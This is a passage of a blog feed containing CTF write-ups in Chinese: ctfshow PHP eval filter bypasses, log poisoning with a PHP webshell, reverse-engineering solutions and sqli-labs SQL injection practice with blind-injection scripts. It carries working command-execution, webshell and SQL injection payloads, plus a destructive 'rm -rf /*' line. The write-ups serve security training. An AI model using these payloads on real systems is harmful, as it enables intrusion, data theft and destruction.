            "content_html": "<p>常见的一些命令执行的语句</p>\n<pre><code class=\"raw\">system()\npassthru()\nexec()\nshell_exec()\npopen()\nproc_open()\npcntl_exec()\n</code></pre>\n<p>各种绕过姿势，总结一下</p>\n<ol>\n<li><p>构造<code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code></p>\n</li>\n<li><p>cat 绕过<code>?c=system('ca\"\"t config.php')</code></p>\n</li>\n<li><p>base64 绕过<code>?c=$a = base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);</code></p>\n</li>\n<li><p>闭合<code>?c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?&gt;</code></p>\n</li>\n<li><p>POST 传值</p>\n<pre><code class=\"raw\">?c=echo `$_POST[1]`?&gt;\n\n?c=echo `$_POST[1]`;\n\n然后通过 post 方式传入 1=cat config.php\n</code></pre>\n</li>\n</ol>\n<h1 id=\"萌新-隐写-4\"><a href=\"#萌新-隐写-4\" class=\"headerlink\" title=\"萌新 隐写 4\"></a>萌新 隐写 4</h1><p>word 文件中的选项有隐藏文字这一选项，勾上能查看隐藏的文字</p>\n<h1 id=\"web-3\"><a href=\"#web-3\" class=\"headerlink\" title=\"web 3\"></a>web 3</h1><p>使用逻辑符绕过</p>\n<p><code>?id=10 || id=1000</code></p>\n<h1 id=\"web-4\"><a href=\"#web-4\" class=\"headerlink\" title=\"web 4\"></a>web 4</h1><p>使用字符串:<code>?id=\"1000\"</code></p>\n<h1 id=\"web-5\"><a href=\"#web-5\" class=\"headerlink\" title=\"web 5\"></a>web 5</h1><p>使用异或:<code>?id=328^672</code></p>\n<p>使用运算符绕过<code>?id=~~1000</code></p>\n<h1 id=\"web-6\"><a href=\"#web-6\" class=\"headerlink\" title=\"web 6\"></a>web 6</h1><p>使用运算符绕过<code>?id=~~1000</code></p>\n<h1 id=\"web-7\"><a href=\"#web-7\" class=\"headerlink\" title=\"web 7\"></a>web 7</h1><p>使用二进制绕过 1000 的二进制</p>\n<p>各进制的前缀</p>\n<ul>\n<li><strong>二进制：0b</strong></li>\n<li><strong>八进制：0O</strong></li>\n<li><strong>十进制：无前缀</strong></li>\n<li><strong>十六进制：0x</strong></li>\n</ul>\n<p>故构造 payload <code>?id=0b1111101000</code></p>\n<h1 id=\"web-8\"><a href=\"#web-8\" class=\"headerlink\" title=\"web 8\"></a>web 8</h1><p>梗题 </p>\n<p>弹窗中有 “熟悉的一顿操作后，去了埃塞俄比亚” </p>\n<p>去了那么远，那么极有可能是删库跑路 而删库跑路的命令为 <code>rm -rf /*</code></p>\n<h1 id=\"web-9\"><a href=\"#web-9\" class=\"headerlink\" title=\"web 9\"></a>web 9</h1><p>题目源码</p>\n<pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(preg_match(\"/system|exec|highlight/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>即包含 <code>system</code> 或 <code>exec</code> 或 <code>highlight</code> 才会执行 <code>eval</code> 函数 </p>\n<p>而 <code>eval</code> 会将 <code>c</code> 作为 PHP 代码执行 这里只需显示 <code>config.php</code> 文件内容即可 </p>\n<p>这里用到了 <code>highlight_file()</code> 函数 <code>highlight_file(string $filename, bool $return false);</code> </p>\n<p>即代码高亮 filename 文件，若第二个参数是 <code>false</code>，则打印输出文件，若 <code>true</code>，则将其转换为字符串返回</p>\n<h1 id=\"web-10\"><a href=\"#web-10\" class=\"headerlink\" title=\"web 10\"></a>web 10</h1><p>绕过,采用字符串拼接</p>\n<p><code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code> 或 </p>\n<p><code>?c=$a='high';$b='light_file';$d=$a.$b;$d('config.php');</code></p>\n<h1 id=\"web-11\"><a href=\"#web-11\" class=\"headerlink\" title=\"web 11\"></a>web 11</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt; \n</code></pre>\n<p><code>?c=passthru(‘tac config.php’);</code></p>\n<h1 id=\"web-12\"><a href=\"#web-12\" class=\"headerlink\" title=\"web 12\"></a>web 12</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat|\\.|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt; \n</code></pre>\n<p><code>?c=passthru(‘tac confi*’);</code></p>\n<p><code>?c=$a=base64_decode(‘Y29uZmlnLnBocA==’);passthru(“more $a”);</code></p>\n<h1 id=\"web-13\"><a href=\"#web-13\" class=\"headerlink\" title=\"web 13\"></a>web 13</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat|\\.|\\;|file|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>分号被过滤了，考虑到结束符隐藏有分号，那么用结束符 <code>&gt;?</code> 代替分号</p>\n<h1 id=\"web-14\"><a href=\"#web-14\" class=\"headerlink\" title=\"web 14\"></a>web 14</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|exec|highlight|cat|\\(|\\.|\\;|file|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>源码中通过 GET 请求获取参数，并过滤了参数中的 <code>system exec highlight cat ( . ; file php config</code> 等关键字，</p>\n<p>这里有几个比较重要的点 </p>\n<ol>\n<li>过滤了括号 <code>( </code>, 函数不能用了，但仍然可以用反引号 ` 来执行系统命令 </li>\n<li>过滤了分号<code>；</code>, 可以使用<code>?&gt;</code> 来代替分号，但这样一来就只能执行一行代码，增加了解题的难度 </li>\n<li>源码中的过滤只针对 GET 请求的参数，并未对 POST 请求的参数做限制，可以利用这一点搞事情</li>\n</ol>\n<p>首先我们通过 GET 请求的参数传递一句话木马，<code>$_POST[a]</code> 接收 POST 请求传递的参数，而后反引号将接收的参数当做系统命令执行, 由于反引号执行完成后并不输出结果，而是返回一个保存执行结果的字符串类型变量，所以需要使用 <code>echo</code> 来输出这个变量，从而输出执行结果</p>\n<pre><code class=\"raw\">?c=echo `$_POST[a]`?&gt;\n</code></pre>\n<p>而后使用代理工具 (Burp Suite) 抓包，在 POST 请求中传递需要执行的系统命令，这里需要注意两个地方 ( 如果使用的是其他工具可以忽略) </p>\n<ol>\n<li>拦截的请求是 GET 请求，需要改成 POST 请求才能在请求体中传递参数 </li>\n<li>由于手动将 GET 请求改成了 POST 请求，需要再手动添加 <code>Content-Type: application/x-www-form-urlencoded</code> , 否则将无法正常发送 POST 请求的参数 <code>a=cat config.php</code></li>\n</ol>\n<p>或者直接用 Hackbar</p>\n<h1 id=\"web-15\"><a href=\"#web-15\" class=\"headerlink\" title=\"web 15\"></a>web 15</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(!preg_match(\"/system|\\\\*|\\?|\\&lt;|\\&gt;|\\=|exec|highlight|cat|\\(|\\.|file|php|config/i\",$c)){\n                eval($c);\n        }else{\n            die(\"cmd error\");\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<pre><code class=\"raw\">?c=echo $_GET[1];&amp;1=tac config.php\n</code></pre>\n<h1 id=\"web-16\"><a href=\"#web-16\" class=\"headerlink\" title=\"web 16\"></a>web 16</h1><pre><code class=\"php\">&lt;?php\n# flag in config.php\ninclude(\"config.php\");\nif(isset($_GET['c'])){\n        $c = $_GET['c'];\n        if(md5(\"ctfshow$c\")===\"a6f57ae38a22448c2f07f3f95f49c84e\"){\n            echo $flag;\n        }else{\n            echo \"nonono!\";\n        }\n}else{\n        highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p>爆破</p>\n<p>代码为</p>\n<pre><code class=\"python\">import hashlib\nstr1 = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\npayload = ''\nfor i in str1:\n    for j in str1:\n        for k in str1:\n            s = hashlib.md5(('ctfshow'+i+j+k).encode()).hexdigest()\n            # print(type(s))\n            if s == 'a6f57ae38a22448c2f07f3f95f49c84e':\n                print(i+j+k)\n</code></pre>\n<h1 id=\"web-17-x2F-18-x2F-19-x2F-20-x2F-21\"><a href=\"#web-17-x2F-18-x2F-19-x2F-20-x2F-21\" class=\"headerlink\" title=\"web 17/18/19/20/21\"></a>web 17/18/19/20/21</h1><p>17 </p>\n<p>18 过滤了 file </p>\n<p>19 过滤了 base </p>\n<p>20 过滤了 rot </p>\n<p>21 过滤了： c 传参过滤掉 php </p>\n<p>思路：</p>\n<p>include 文件包含</p>\n<p>利用日志文件包含,访问日志文件：<code>?c=/var/log/nginx/access.log</code></p>\n<p>发现日志文件记录了 <code>user-agent</code> 头，于是在该头中插入一句话木马：<code>&lt;?php eval($_POST['a']);?&gt;</code></p>\n<p>然后可使用蚁剑连接，密码即为 <code>a</code> 然后看到有 <code>36d.php</code>，打开后得到 flag</p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/dd66f6b6/",
            "url": "http://dpm12345.cn/posts/dd66f6b6/",
            "title": "萌新赛",
            "date_published": "2022-10-03T16:10:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"给他\"><a href=\"#给他\" class=\"headerlink\" title=\"给他\"></a>给他</h2><p>源码</p>\n<pre><code class=\"php\">&lt;?php \n    $pass=sprintf(\"and pass='%s'\",addslashes($_GET['pass'])); \n    $sql=sprintf(\"select * from user where name='%s' $pass\",addslashes($_GET['name'])); \n?&gt;\n</code></pre>\n<p><img data-src=\"/../../../post_images/ctfshow/%E8%90%8C%E6%96%B0%E8%B5%9B/web_%E7%BB%99%E4%BB%96.png\"></p>\n<p>payload: <code>?name=admin&amp;pass=%1$' or 1=1--+</code></p>\n<p>这里修改的原因为，%1的话连接到sql上时，%1会被解析为空，那么$‘成为新的变量，因而输出的sql为</p>\n<p><code>select * from user where name='admin' and pass='''</code></p>\n<p>那么此时如果在后面添加，比如 <code>or 1=1--+</code></p>\n<p>那么得到sql语句为<code>'select * from user where name='admin' and pass='' or 1=1-- '</code>, 也就是成立</p>\n<p>之后得到一个假的404页面</p>\n<p>查看源码，可以看到flag的位置/flag</p>\n<p>抓包，看见cookie里有file=666c61672e747874，后面内容十六进制解码后为flag.txt</p>\n<p>使用伪协议，base64，十六进制编码输入后，不行</p>\n<p>使用 rot13</p>\n<p>得到<code>PGSFUBJ{S3622181-0S53-494R-N344-7P6001S38SQ1}</code></p>\n<p>得到后rot13解码，得到flag</p>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>命令执行，不同命令间可用分号分隔，一条一条执行</p>\n<p><code>?url=a;ls;a</code></p>\n<p><code>?url=a;cat flag;a</code></p>\n<h2 id=\"假赛生\"><a href=\"#假赛生\" class=\"headerlink\" title=\"假赛生\"></a>假赛生</h2><p>根据题目，有register.php和login.php</p>\n<p>由代码，需要name=admin，于是注册 admin 的用户</p>\n<p>发现不能注册，于是在admin后加上空格，尝试使用admin登入，发现可以</p>\n<p>之后传入c的值，由正则<code>\\w 匹配字母或数字或下划线或汉字</code> </p>\n<p>可传入空值即可绕过</p>\n<p>得到flag</p>\n<h2 id=\"萌新记忆\"><a href=\"#萌新记忆\" class=\"headerlink\" title=\"萌新记忆\"></a>萌新记忆</h2><p>进入admin目录，有登陆页面，</p>\n<p>抓包，测试，</p>\n<p>经过一番尝试在没有语句错误的情况下发现有三种返回结果</p>\n<ol>\n<li>用户名/密码错误：当输入的用户名不为admin且不超过限制的长度时</li>\n<li>用户名错误：用户名长度超过限制 (字符长度最大为 20)</li>\n<li>密码错误：输入用户名为admin</li>\n<li>通过测试发现未过滤的字符有单引号 (’)、逗号（,）、括号（（））、小于号 (&lt;)、或（||）、substr ()、lift、right、length ()</li>\n</ol>\n<p>首先获取字段长度</p>\n<p><code>'||length(p)&lt;'100&amp;p=1</code></p>\n<p>当小于18返回<strong>密码错误</strong>，小于17<strong>返回用户名/密码错误</strong></p>\n<p>因此，密码字段长度为17</p>\n<p>爆破</p>\n<p>脚本为</p>\n<pre><code class=\"python\">import requests\nurl = 'http://912753e7-33da-4383-bd60-939a7885131d.challenge.ctf.show/admin/checklogin.php'\ns = '0123456789abcdefghijklmnopqrstuvwxyz'\nflag = ''\nfor i in range(1, 18):\n    print('*')\n    for j in s:\n        data = {\"u\": \"'||substr(p,\"+str(i)+\",1)&lt;'\"+j,\n                \"p\": \"1\"\n                }\n        r = requests.post(url, data=data)\n        # print(r.text)\n        if \"密码错误\" == r.text:\n            flag += chr(ord(j)-1)\n            print(flag)\n            break\n</code></pre>\n<p>得到密码<code>cptbtptpbcptdtptp</code></p>\n<p>登录得到flag</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"数学不及格\"><a href=\"#数学不及格\" class=\"headerlink\" title=\"数学不及格\"></a>数学不及格</h2><p>打开</p>\n<pre><code class=\"cpp\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+14h] [rbp-4Ch]\n  char *endptr; // [rsp+18h] [rbp-48h] BYREF\n  char *v6; // [rsp+20h] [rbp-40h] BYREF\n  char *v7; // [rsp+28h] [rbp-38h] BYREF\n  char *v8; // [rsp+30h] [rbp-30h] BYREF\n  __int64 v9; // [rsp+38h] [rbp-28h]\n  __int64 v10; // [rsp+40h] [rbp-20h]\n  __int64 v11; // [rsp+48h] [rbp-18h]\n  __int64 v12; // [rsp+50h] [rbp-10h]\n  unsigned __int64 v13; // [rsp+58h] [rbp-8h]\n\n  v13 = __readfsqword(0x28u);\n  if ( argc != 5 )\n  {\n    puts(\"argc nonono\");\n    exit(1);\n  }\n  v4 = strtol(argv[4], &amp;endptr, 16) - 25923;\n  v9 = f(v4);\n  v10 = strtol(argv[1], &amp;v6, 16);\n  v11 = strtol(argv[2], &amp;v7, 16);\n  v12 = strtol(argv[3], &amp;v8, 16);\n  if ( v9 - v10 != 0x233F0E151CLL )\n  {\n    puts(\"argv1 nonono!\");\n    exit(1);\n  }\n  if ( v9 - v11 != 0x1B45F81A32LL )\n  {\n    puts(\"argv2 nonono!\");\n    exit(1);\n  }\n  if ( v9 - v12 != 0x244C071725LL )\n  {\n    puts(\"argv3 nonono!\");\n    exit(1);\n  }\n  if ( v4 + v12 + v11 + v10 != 0x13A31412F8CLL )\n  {\n    puts(\"argv sum nonono!\");\n    exit(1);\n  }\n  puts(\"well done!decode your argv!\");\n  return 0;\n}\n</code></pre>\n<p>经分析，f函数为求斐波那契数列的函数</p>\n<p>需要输入四个参数，使得满足函数中的各个条件</p>\n<p>逆向推理</p>\n<pre><code class=\"python\">v9 = f(v4-25923)\nv10 = v9 - 0x233F0E151C\nv11 = v9 - 0x1B45F81A32\nv12 = v9 - 0x244C071725\nv4 + v12 + v11 + v10 != 0x13A31412F8CLL\n</code></pre>\n<p>由此可以通过爆破方式，穷举v4的值，得到答案。由于输入时参数形式为16进制，故解得的个参数需要用十六进制解码</p>\n<p>于是</p>\n<pre><code class=\"python\">\ndef f(n):\n    a=1\n    b=1\n    i=2\n    while i&lt;n:\n       a,b = b,a+b \n       i+=1\n    return b\n\n\nv4 = 25929\n\ndef main():\n    while True:\n        global v4\n        v9 = f(v4-25923)\n        # print(v9)\n        v10 = v9 - 0x233F0E151C \n        v11 = v9 - 0x1B45F81A32\n        v12 = v9 - 0x244C071725\n        if v4 - 25923 + v10 + v11 + v12 != 0x13A31412F8C:\n            v4 += 1\n            continue\n        print(\"well done!decode your argv!\")\n        print(hex(v10),v11,v12,v4,sep=\" \")\n        print(bytes.fromhex(hex(v10)[2:])+bytes.fromhex(hex(v11)[2:])+bytes.fromhex(hex(v12)[2:])+bytes.fromhex(hex(v4)[2:]))\n        break\n\nmain()\n</code></pre>\n<p>解得</p>\n<pre><code class=\"raw\">well done!decode your argv!\n439904987003 474148725349 435392374130 25981\nb'flag{newbee_here}\n</code></pre>\n<h2 id=\"flag白给\"><a href=\"#flag白给\" class=\"headerlink\" title=\"flag白给\"></a>flag白给</h2><p>PE查壳，可知为Upx加壳</p>\n<p>脱壳后，IDA打开，字符串窗口，可以看到<code>CODE:004547AC\t00000007\tC\tHackAv</code></p>\n<p>跟进可以看到成功等字样，猜测此为序列号，输入验证，成功</p>\n<p>故flag为<code>flag{HackAv}</code></p>\n<p>(或者根据返回错误文本”错误”，搜索字符串，可以看到”成功也在附近”，之后找到序列号)</p>\n<h2 id=\"签退\"><a href=\"#签退\" class=\"headerlink\" title=\"签退\"></a>签退</h2><p>uncompyle6反编译，得到</p>\n<pre><code class=\"python\"># uncompyle6 version 3.8.0\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 3.10.4 | packaged by conda-forge | (main, Mar 30 2022, 08:38:02) [MSC v.1916 64 bit (AMD64)]\n# Embedded file name: re3.py\n# Compiled at: 2020-03-06 17:43:28\nimport string\nc_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '()'\nflag = 'BozjB3vlZ3ThBn9bZ2jhOH93ZaH9'\n\ndef encode(origin_bytes):\n    c_bytes = [ ('{:0&gt;8}').format(str(bin(b)).replace('0b', '')) for b in origin_bytes ]\n    resp = ''\n    nums = len(c_bytes) // 3\n    remain = len(c_bytes) % 3\n    integral_part = c_bytes[0:3 * nums]\n    while integral_part:\n        tmp_unit = ('').join(integral_part[0:3])\n        tmp_unit = [ int(tmp_unit[x:x + 6], 2) for x in [0, 6, 12, 18] ]\n        resp += ('').join([ c_charset[i] for i in tmp_unit ])\n        integral_part = integral_part[3:]\n\n    if remain:\n        remain_part = ('').join(c_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n        tmp_unit = [ int(remain_part[x:x + 6], 2) for x in [0, 6, 12, 18] ][:remain + 1]\n        resp += ('').join([ c_charset[i] for i in tmp_unit ]) + (3 - remain) * '.'\n    return rend(resp)\n\n\ndef rend(s):\n\n    def encodeCh(ch):\n        f = lambda x: chr((ord(ch) - x + 2) % 26 + x)\n        if ch.islower():\n            return f(97)\n        if ch.isupper():\n            return f(65)\n        return ch\n\n    return ('').join(encodeCh(c) for c in s)\n</code></pre>\n<p>猜测对flag进行了rend操作</p>\n<p>编写derend，转回</p>\n<pre><code class=\"python\">def derend(s):\n\n    def decodeCh(ch):\n        f = lambda x: chr((ord(ch) - x - 2) % 26 + x)\n        if ch.islower():\n            return f(97)\n        if ch.isupper():\n            return f(65)\n        return ch\n\n    return ('').join(decodeCh(c) for c in s)\n</code></pre>\n<p>调用后，得到<code>ZmxhZ3tjX3RfZl9zX2hfMF93XyF9</code>，base64解码后为<code>flag{c_t_f_s_h_0_w_!}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/3b76a5dc/",
            "url": "http://dpm12345.cn/posts/3b76a5dc/",
            "title": "宝塔的相关使用",
            "date_published": "2022-09-23T02:54:43.000Z",
            "content_html": "<h1 id=\"开启目录浏览\"><a href=\"#开启目录浏览\" class=\"headerlink\" title=\"开启目录浏览\"></a>开启目录浏览</h1><p>在建立自己的一个web靶场时，会想要使用目录浏览，为了无需输入，这里可以利用以下代码开启目录浏览 找到需要设置的网站，点击设置，找到伪静态选项，然后再框内复制如下内容</p>\n<pre><code class=\"raw\">location   / {\n    autoindex on;\n    autoindex_exact_size off;\n    charset utf-8,gbk;\n    autoindex_localtime on;\n    }\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/ca25cf0b/",
            "url": "http://dpm12345.cn/posts/ca25cf0b/",
            "title": "sqli-labs练习",
            "date_published": "2022-09-22T18:48:08.000Z",
            "content_html": "<h1 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less 1\"></a>less 1</h1><p>输入<code>id</code>值，测试为字符型注入(此处注释符不能用<code>#</code>，可用<code>--+</code>)</p>\n<p>然后使用<code>order by x</code>，确认列数，为3列</p>\n<p>然后传入</p>\n<p><code>-1' union select 1,2,3--+</code></p>\n<p>确定输入位置，分别为2和3</p>\n<p>之后正常爆库、表、列</p>\n<h1 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less 2\"></a>less 2</h1><p>输入<code>id</code>，测试为整型注入，之后操作同less 1</p>\n<h1 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less 3\"></a>less 3</h1><p>输入<code>id</code>，纯数字，无报错，加上一个单引号，报错</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0'') LIMIT 0,1' at </code></p>\n<p><code>line 1</code></p>\n<p>可判断为字符型注入，且有括号，之后操作如前</p>\n<h1 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less 4\"></a>less 4</h1><p>此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可</p>\n<h1 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less 5\"></a>less 5</h1><p>此题输入<code>id=1</code>，发现返回的是<code>You are in...</code></p>\n<p>可以推断这题使用bool盲注，<code>substr</code>，<code>length()</code>,<code>left</code>之类的函数使用，或者可以用时间盲注</p>\n<p><code>ascii 可以换 </code>ord`</p>\n<pre><code class=\"python\">'''\nAuthor       : zhong\nsince        : 2022-08-20 16:05:07\nLastAuthor   : zhong\nlastTime     : 2022-08-20 16:31:08\nblog         : http://dpm12345.cn/\nemail        : 1006975692@qq.com\n'''\nimport requests\nurl = \"http://192.168.47.132:5000/sqli-labs/Less-5/?id=1' and ascii(substr({},{},1))={}--+\"\ntarget = \"\"\nresult = \"#\"\ni = 0\nwhile True:\n    i += 1\ntarget = \"(select group_concat(schema_name)from information_schema.schemata)\"\n    # information_schema,challenges,mysql,performance_schema,security,test\n    # target = \"database()\"\n    # security\n    # target = \"(select group_concat(table_name)from information_schema.tables where table_schema='security')\"\n    # emails,referers,uagents,users\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')\"\n    # #id,username,password\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='uagents')\"\n    # #id,uagent,ip_address,username\n    # target = \"(select group_concat(id,0x7e,username,0x7e,password)from security.users)\"\n    # #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4\n    target = \"(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)\"\n    if i &gt; len(result):\n        break\n    for j in range(33, 128):\n        str = chr(j)\n        print(str)\n        res = requests.get(url.format(target, i, j))\n        if \"You are in\" in res.text:\n            result += str\n            print(result)\n            break\nprint(result)\n\n# security\n# emails,referers,uagents,users\n</code></pre>\n<h1 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less 6\"></a>less 6</h1><p>与less5相比，单引号改为双引号</p>\n<h1 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h1><p>相比上一个，其sql语句应为<code>where id = (('$id'))</code>，故闭合一个单引号和两个括号，之后和前面脚本一样</p>\n<h1 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" title=\"less 8\"></a>less 8</h1><p>同less5</p>\n<h1 id=\"less-9\"><a href=\"#less-9\" class=\"headerlink\" title=\"less 9\"></a>less 9</h1><p>不管什么都显示相同，故采用时间盲注</p>\n<p>payload：<code>?id=1' and if(ascii(substr({},{},1))={},sleep(1),2)--+</code></p>\n<h1 id=\"less-10\"><a href=\"#less-10\" class=\"headerlink\" title=\"less 10\"></a>less 10</h1><p>第九题改单引号为双引号</p>\n<h1 id=\"less-11\"><a href=\"#less-11\" class=\"headerlink\" title=\"less 11\"></a>less 11</h1><p>联合查询</p>\n<p>payload</p>\n<pre><code class=\"sql\">passwd=admin&amp;uname=' union select 1,database()--+\npasswd=admin&amp;uname=' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security')--+\n或者使用报错注入\n\npasswd=1&amp;uname=1' and updatexml(0x7e,concat(0x7e,database()),0x7e)--+\n或者\npasswd=1&amp;uname=1'union (select 1,2 from(select count(*),concat((select (select (select concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23\n</code></pre>\n<h1 id=\"less-12\"><a href=\"#less-12\" class=\"headerlink\" title=\"less 12\"></a>less 12</h1><p>与 11 相比，闭合使用<code>\")</code></p>\n<p>其他同</p>\n<h1 id=\"less-13\"><a href=\"#less-13\" class=\"headerlink\" title=\"less 13\"></a>less 13</h1><p>闭合使用<code>')</code>，使用报错注入，其他无显示</p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/29fef1ad/",
            "url": "http://dpm12345.cn/posts/29fef1ad/",
            "title": "sqli-labs 练习",
            "date_published": "2022-09-22T16:07:26.000Z",
            "content_html": "<h1 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less 1\"></a>less 1</h1><p>输入 id 值，测试为字符型注入 (此处注释符不能用 <code>#</code> ，可用 <code>--+</code> ) </p>\n<p>然后使用 <code>order by x</code>，确认列数，为 <code>3</code> 列 然后传入</p>\n<pre><code class=\"raw\">-1' union select 1,2,3--+\n</code></pre>\n<p>确定输入位置，分别为 2 和 3</p>\n<p>之后正常爆库、表、列</p>\n<h1 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less 2\"></a>less 2</h1><p>输入 id，测试为整型注入，之后操作同 less 1</p>\n<h1 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less 3\"></a>less 3</h1><p>输入 id，纯数字，无报错，加上一个单引号，报错</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0'') LIMIT 0,1' at line 1</code></p>\n<p>可判断为字符型注入，且有括号，之后操作如前</p>\n<h1 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less 4\"></a>less 4</h1><p>此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可</p>\n<h1 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less 5\"></a>less 5</h1><p>此题输入 id=1，发现返回的是 You are in… </p>\n<p>可以推断这题使用 bool 盲注，substr，length (),left 之类的函数使用，或者可以用时间盲注 </p>\n<p>ascii 可以换 ord</p>\n<pre><code class=\"python\">'''\nAuthor       : zhong\nsince        : 2022-08-20 16:05:07\nLastAuthor   : zhong\nlastTime     : 2022-08-20 16:31:08\nblog         : http://dpm12345.cn/\nemail        : 1006975692@qq.com\n'''\nimport requests\n\nurl = \"http://192.168.47.132:5000/sqli-labs/Less-5/?id=1' and ascii(substr({},{},1))={}--+\"\n\ntarget = \"\"\nresult = \"#\"\ni = 0\nwhile True:\n    i += 1\n    # target = \"(select group_concat(schema_name)from information_schema.schemata)\"\n    # information_schema,challenges,mysql,performance_schema,security,test\n    # target = \"database()\"\n    # security\n    # target = \"(select group_concat(table_name)from information_schema.tables where table_schema='security')\"\n    # emails,referers,uagents,users\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')\"\n    # #id,username,password\n    # target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='uagents')\"\n    # #id,uagent,ip_address,username\n    # target = \"(select group_concat(id,0x7e,username,0x7e,password)from security.users)\"\n    # #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4\n    target = \"(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)\"\n    if i &gt; len(result):\n        break\n    for j in range(33, 128):\n        str = chr(j)\n        print(str)\n        res = requests.get(url.format(target, i, j))\n        if \"You are in\" in res.text:\n            result += str\n            print(result)\n            break\nprint(result)\n\n# security\n# emails,referers,uagents,users\n</code></pre>\n<h1 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less 6\"></a>less 6</h1><p>与 less5 相比，单引号改为双引号</p>\n<h1 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h1><p>相比上一个，起 sql 语句应为 <code>where id = (('$id'))</code> ，故闭合一个单引号和两个括号，之后和前面脚本一样</p>\n<h1 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" 